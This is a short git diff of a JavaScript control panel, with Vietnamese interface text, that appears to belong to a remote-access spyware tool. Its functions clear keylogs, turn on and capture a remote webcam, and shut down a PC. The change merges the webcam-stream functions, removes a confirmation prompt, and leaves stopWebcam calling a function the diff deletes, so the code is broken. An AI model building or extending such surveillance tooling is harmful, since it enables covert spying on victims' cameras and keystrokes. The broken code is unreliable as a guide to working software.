@@ -300,13 +300,11 @@ function clearKeylogs() {
 }
 
 function startWebcam() {
-    sendCommand('WEBCAM_ON');
+    sendCommand('WEBCAM_ON');// web cam on trc
     document.getElementById('webcamContainer').innerHTML =
         '<div class="webcam-placeholder"><div class="icon">📹</div><h3>Đang khởi động...</h3></div>';
-}
 
-function startWebcamStream() {
-    if (isWebcamStreaming) {
+     if (isWebcamStreaming) {
         alert('Stream đang chạy!');
         return;
     }
@@ -314,28 +312,16 @@ function startWebcamStream() {
     isWebcamStreaming = true;
     frameCount = 0;
     lastFpsUpdate = Date.now();
-}
-
-function stopWebcamStream() {
-    if (!isWebcamStreaming) return;
-    sendCommand('WEBCAM_STREAM_STOP');
-    isWebcamStreaming = false;
-    document.getElementById('webcamContainer').innerHTML =
-        '<div class="webcam-placeholder"><div class="icon">⏸️</div><h3>Stream đã dừng</h3></div>';
-}
-
+}   
 function captureWebcam() {
     sendCommand('WEBCAM_CAPTURE');
 }
-
 function stopWebcam() {
-    if (confirm('Tắt webcam?')) {
         stopWebcamStream();
         sendCommand('WEBCAM_OFF');
         document.getElementById('webcamContainer').innerHTML =
             '<div class="webcam-placeholder"><div class="icon">📹</div><h3>Webcam đã tắt</h3></div>';
-        document.getElementById('webcamSnapshots').innerHTML = '';
-    }
+        document.getElementById('webcamSnapshots').innerHTML = '';   
 }
 
 function shutdownPC() {
